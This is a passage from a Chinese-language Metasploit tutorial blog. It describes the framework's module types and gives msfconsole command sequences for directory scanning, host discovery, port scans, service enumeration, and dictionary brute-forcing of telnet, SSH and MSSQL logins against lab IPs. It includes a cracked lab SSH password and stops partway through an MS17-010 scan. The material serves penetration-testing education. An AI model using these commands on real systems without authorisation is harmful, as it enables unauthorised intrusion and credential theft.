主动渗透攻击（攻击者主动出击）</h3><p>所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听端口并等待客户端连接，因此针对它们的渗透攻击可以主动发起，通过连接目标系统网络服务，注入一些特殊构造的包含”邪恶”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务进程执行在”邪恶”数据中包含攻击载荷，从而获取目标系统的控制会话。</p><h3 id="4-2-2-被动渗透攻击（被动等待受害者出发）"><a href="#4-2-2-被动渗透攻击（被动等待受害者出发）" class="headerlink" title="4.2.2 被动渗透攻击（被动等待受害者出发）"></a>4.2.2 被动渗透攻击（被动等待受害者出发）</h3><p> 利用的漏洞位于客户端软件中，如浏览器、浏览器插件、电子邮件客户端、Office 与Adobe 等各种文档阅读与编辑软件。对于这类存在于客户端软件的安全漏洞，我们无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击的方式，即构造出”邪恶”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务、发送邮件附件、结合社会工程学分发并诱骗目标用户打开、结合网络欺骗和劫持技术等方式，等目标系统上的用户访问到这些邪恶的内容，从而触发客户端软件中的安全漏洞，给出控制目标系统的Shell 会话。</p><h2 id="4-3-攻击载荷模块"><a href="#4-3-攻击载荷模块" class="headerlink" title="4.3 攻击载荷模块"></a>4.3 攻击载荷模块</h2><p>  攻击载荷是在渗透攻击成功后使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。</p><h2 id="4-4-空指令模块"><a href="#4-4-空指令模块" class="headerlink" title="4.4 空指令模块"></a>4.4 空指令模块</h2><p>  空指令(NOP) 是一些对程序运行状态不会造成任何实质影响的空操作或者无关操作指令，最典型的空指令就是空操作，在x86 CPU 体系架构平台上的操作码是0x90 。</p><h2 id="4-5-编码器模块"><a href="#4-5-编码器模块" class="headerlink" title="4.5 编码器模块"></a>4.5 编码器模块</h2><p>   攻击载荷模块与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit 框架还需要完成一道非常重要的工序–编码。</p><p>  编码器模块的第一个使命就是确保攻击载荷中不会出现渗透攻击过程中应加以避免的”坏字符”。</p><p>  编码器的第二个使命就是对攻击载荷进行”免杀”处理。</p><h2 id="4-6-后渗透攻击模块"><a href="#4-6-后渗透攻击模块" class="headerlink" title="4.6 后渗透攻击模块"></a>4.6 后渗透攻击模块</h2><p>​    后渗透攻击模块主要支持在渗透攻击取得目标系统控制权之后，在受控系统中进行各式各样的后渗透攻击动作，比如获取敏感信息、进一步拓展、实施跳板攻击等。</p><h2 id="4-7-免杀模块"><a href="#4-7-免杀模块" class="headerlink" title="4.7 免杀模块"></a>4.7 免杀模块</h2><p>   对攻击载荷进行”免杀”处理。</p><h1 id="五、MSF的基础使用"><a href="#五、MSF的基础使用" class="headerlink" title="五、MSF的基础使用"></a>五、MSF的基础使用</h1><h2 id="5-1-启动和进入、基本命令"><a href="#5-1-启动和进入、基本命令" class="headerlink" title="5.1 启动和进入、基本命令"></a>5.1 启动和进入、基本命令</h2><h3 id="5-1-1-启动进入"><a href="#5-1-1-启动进入" class="headerlink" title="5.1.1 启动进入"></a>5.1.1 启动进入</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2013.52.34.png" style="zoom:30%;"><p>内置模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.0.30-dev                          <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2099</span> exploits - <span class="token number">1129</span> auxiliary - <span class="token number">357</span> post       <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">592</span> payloads - <span class="token number">45</span> encoders - <span class="token number">10</span> nops            <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">7</span> evasion                                       <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-1-2-内置安装模块"><a href="#5-1-2-内置安装模块" class="headerlink" title="5.1.2 内置安装模块"></a>5.1.2 内置安装模块</h3><p>进入软件安装目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/share/metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关注modules目录，里面是msf内置的各类模块。</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2013.55.23.png" style="zoom:40%;"><h3 id="5-1-3-使用模块的基本命令"><a href="#5-1-3-使用模块的基本命令" class="headerlink" title="5.1.3 使用模块的基本命令"></a>5.1.3 使用模块的基本命令</h3><ul><li><p>search 【查找可用模块】eg:<code>search ms17-010</code></p></li><li><p>info 【查看模块信息】</p></li><li><p>set 【设置参数】</p></li><li><p>show options 【显示参数设置情况】</p></li><li><p>back 【回退】</p></li></ul><h2 id="5-2-更新（就是重装）"><a href="#5-2-更新（就是重装）" class="headerlink" title="5.2 更新（就是重装）"></a>5.2 更新（就是重装）</h2><p>[apt-get update]</p><p>[apt-get install metasploit-framework]</p><p>⚠️：一个模块就是一个rb 脚本，例如：</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2013.58.45.png" style="zoom:30%;"><h2 id="5-3-情报搜集"><a href="#5-3-情报搜集" class="headerlink" title="5.3 情报搜集"></a>5.3 情报搜集</h2><h3 id="5-3-1-网站敏感目录扫描（类比御剑）"><a href="#5-3-1-网站敏感目录扫描（类比御剑）" class="headerlink" title="5.3.1 网站敏感目录扫描（类比御剑）"></a>5.3.1 网站敏感目录扫描（类比御剑）</h3><ul><li><p>可以借助Metasploit 中的brute_dirs、dir_listing、dir_scanner 等辅助模块来进行敏感目录扫描。</p></li><li><p>他们主要使用暴力猜解的方式工作，注意此处需要提供一个目录字典。</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/http/dir_scanner msf5 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.138RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.138msf5 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> <span class="token environment constant">PATH</span> /cms/<span class="token environment constant">PATH</span> <span class="token operator">=</span><span class="token operator">&gt;</span> /cms/msf5 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="实战EX：使用MSF-dir-scanner-发现敏感目录"><a href="#实战EX：使用MSF-dir-scanner-发现敏感目录" class="headerlink" title="实战EX：使用MSF dir_scanner 发现敏感目录"></a>实战EX：使用MSF dir_scanner 发现敏感目录</h3><p>（目标 2008 <a href="http://192.168.33.4/cms/">http://192.168.33.4/cms/</a></p><p> 1、use 相应的模块</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">&gt;</span> use auxiliary/scanner/http/dir_scanner msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2、info 查看模块详细信息 </p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2021-07-22%20%E4%B8%8B%E5%8D%889.13.17.png" style="zoom:75%;"><p>3、扫描CMS</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.33.4RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.4msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> path /cmspath <span class="token operator">=</span><span class="token operator">&gt;</span> /cmsmsf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> ThREADS <span class="token number">100</span>ThREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">100</span>msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RPORT <span class="token number">80</span>RPORT <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">80</span>msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detecting error code<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using code <span class="token string">'404'</span> as not found <span class="token keyword">for</span> <span class="token number">192.168</span>.33.4<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/<span class="token punctuation">..</span>./ <span class="token number">403</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/Admin/ <span class="token number">302</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/admin/ <span class="token number">302</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/images/ <span class="token number">200</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/include/ <span class="token number">200</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="5-3-2-主机发现（速度不如Nmap）"><a href="#5-3-2-主机发现（速度不如Nmap）" class="headerlink" title="5.3.2 主机发现（速度不如Nmap）"></a>5.3.2 主机发现（速度不如Nmap）</h3><p>Metasploit 中提供了一些辅助模块可用于主机发现，这些模块位于modules/auxiliary/scanner/discovery/ 目录中。</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxiliary/scanner/discovery/arp_sweepauxiliary/scanner/discovery/empty_udpauxiliary/scanner/discovery/ipv6_multicast_pingauxiliary/scanner/discovery/ipv6_neighborauxiliary/scanner/discovery/ipv6_neighbor_router_advertisementauxiliary/scanner/discovery/udp_probeauxiliary/scanner/discovery/udp_sweep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用arp_sweep 来枚举本地局域网中的所有活跃主机。（速度慢）</p><pre class="line-numbers language-ba" data-language="ba"><code class="language-ba">msf5 &gt; use auxiliary/scanner/discovery/arp_sweep msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 172.16.132.160/24RHOSTS =&gt; 172.16.132.160/24msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 50THREADS =&gt; 50msf5 auxiliary(scanner/discovery/arp_sweep) &gt; exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.09.20.png" style="zoom:40%;"><h3 id="5-3-3-端口扫描（实测效率不如nmap）"><a href="#5-3-3-端口扫描（实测效率不如nmap）" class="headerlink" title="5.3.3 端口扫描（实测效率不如nmap）"></a>5.3.3 端口扫描（实测效率不如nmap）</h3><p>Metasploit 的辅助模块中提供了几款实用的端口扫描器。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxiliary/scanner/portscan/ackauxiliary/scanner/portscan/synauxiliary/scanner/portscan/xmasauxiliary/scanner/portscan/ftpbounceauxiliary/scanner/portscan/tcp    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般情况下推荐使用syn 端口扫描器，因为他的扫描速度较快，结果比较准确且不易被对方察觉。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/portscan/synmsf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/syn<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.138RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.138msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/syn<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/syn<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.14.00.png" style="zoom:40%;"><h3 id="5-3-4-探测服务详细信息"><a href="#5-3-4-探测服务详细信息" class="headerlink" title="5.3.4 探测服务详细信息"></a>5.3.4 探测服务详细信息</h3><p>在Metasploit 中有一些插件可以调用系统中的命令，比如可以使用Nmap 探测目标的详细服务信息，命令</p><p>   [nmap -sS -Pn 192.168.1.1 -sV]，参数说明：</p><blockquote><p>-sS 使用SYN 半连接扫描</p><p>-Pn 在扫描之前，不发送ICME echo 请求测试目标是否活跃</p><p>-sV 探测服务详细版本</p></blockquote> <img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.15.12.png" alt="在msf中使用nmap示例" style="zoom:57%;"><h3 id="5-3-5-服务查点"><a href="#5-3-5-服务查点" class="headerlink" title="5.3.5 服务查点"></a>5.3.5 服务查点</h3><p>在Metasploit 的辅助模块中，有很多用于服务扫描和查点的工具，这些工具通常以[service_name]_version 命名。该模块可用于遍历网络中包含某种服务的主机，并进一步确定服务的版本。</p><h4 id="1）telnet-服务查点"><a href="#1）telnet-服务查点" class="headerlink" title="1）telnet 服务查点"></a>1）telnet 服务查点</h4><p>  Telnet 是一个历史悠久但先天缺乏安全性的网络服务。由于Telnet 没有对传输的数据进行加密，越来越多的管理员渐渐使用更为安全的SSH 协议代替它。尽管如此，很多价格昂贵、使用寿命更长的大型交换机使用Telnet 协议的可能性更大，而此类交换机在网络中的位置一般来说都非常重要。可以使用telnet_version 模块扫描一下是否有主机或设备开启了Tenlnet 服务。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/telnet/telnet_version msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.160/24RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.160/24msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2）ssh服务查点"><a href="#2）ssh服务查点" class="headerlink" title="2）ssh服务查点"></a>2）ssh服务查点</h4><p>通常管理员会使用SSH 对服务器进行远程管理，服务器会向SSH 客户端返回一个远程Shell 连接。如果没有做其他的安全增强配置，只要获取服务的登录口令，就可以使用SSH 客户端登录服务器，那就相当于获取了响应登录用户的所有权限。可以使用ssh_version 模块遍历网络中开启SSH 服务的主机。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/ssh/ssh_version msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.160/24RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.160/24msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="实战EX：使用MSF-ssh-version-SSH服务查点并爆破"><a href="#实战EX：使用MSF-ssh-version-SSH服务查点并爆破" class="headerlink" title="实战EX：使用MSF ssh_version SSH服务查点并爆破"></a>实战EX：使用MSF ssh_version SSH服务查点并爆破</h3><p>192.168.33.0/24</p><p> 1、use 相应的模块</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2021-07-22%20%E4%B8%8B%E5%8D%887.39.03.png" style="zoom:75%;"><p>2、info 查看模块详细信息</p><p>3、扫描</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2021-07-22%20%E4%B8%8B%E5%8D%888.45.30.png" style="zoom:75%;"><p> 4、准备字典爆破</p><p>use auxiliary/scanner/ssh/ssh_login</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.33.6RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.6msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> VERBOSE <span class="token boolean">true</span>VERBOSE <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">true</span>msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PASS_fILE /root/Desktop/msf/ssh-pass.dicPASS_fILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/Desktop/msf/ssh-pass.dicmsf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> USER_fILE /root/Desktop/msf/ssh-user.dicUSER_fILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/Desktop/msf/ssh-user.dicmsf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.19.42.png" style="zoom:50%;"><p>5、结果</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2021-07-22%20%E4%B8%8B%E5%8D%889.10.16.png" style="zoom:75%;"><p>root 123.com</p></blockquote><h4 id="3）mssql服务查点"><a href="#3）mssql服务查点" class="headerlink" title="3）mssql服务查点"></a>3）mssql服务查点</h4><p>可以使用mysql_ping 查找网络模块中的Microsoft SQL Server。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/mssql/mssql_ping msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_ping<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.160/24backRHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.160/24msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_ping<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_ping<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-4-口令猜测"><a href="#5-4-口令猜测" class="headerlink" title="5.4 口令猜测"></a>5.4 口令猜测</h2><h3 id="5-4-1-telnet口令猜测"><a href="#5-4-1-telnet口令猜测" class="headerlink" title="5.4.1 telnet口令猜测"></a>5.4.1 telnet口令猜测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/telnet/telnet_login msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.138RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.138msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> USER_FILE /root/dic/user.dicUSER_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/user.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PASS_FILE /root/dic/pwd.dicPASS_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/pwd.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-4-2-ssh口令猜测"><a href="#5-4-2-ssh口令猜测" class="headerlink" title="5.4.2 ssh口令猜测"></a>5.4.2 ssh口令猜测</h3><p>在确定了网络上的SSH 服务之后，可以使用MSF 中的ssh_login 模块对SSH 服务进行口令猜测攻击，在进行口令攻击之前，需要一个好用的用户名和口令字典。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.160RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.160msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> USER_FILE /root/dic/user.dicUSER_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/user.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PASS_FILE /root/dic/pwd.dicPASS_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/pwd.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-4-3-mssql口令猜测"><a href="#5-4-3-mssql口令猜测" class="headerlink" title="5.4.3 mssql口令猜测"></a>5.4.3 mssql口令猜测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/mssql/mssql_login msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.135RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.135msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> USER_FILE /root/dic/user.dicUSER_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/user.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PASS_FILE /root/dic/pwd.dicPASS_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/pwd.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-5-网络服务渗透攻击"><a href="#5-5-网络服务渗透攻击" class="headerlink" title="5.5 网络服务渗透攻击"></a>5.5 网络服务渗透攻击</h2><h3 id="5-5-1-永恒之蓝"><a href="#5-5-1-永恒之蓝" class="headerlink" title="5.5.1 永恒之蓝"></a>5.5.1 永恒之蓝</h3><h4 id="1）漏洞扫描"><a href="#1）漏洞扫描" class="headerlink" title="1）漏洞扫描"></a>1）漏洞扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---------------msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/smb/smb_ms17_010msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.1.200/24RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.1.200/24msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span 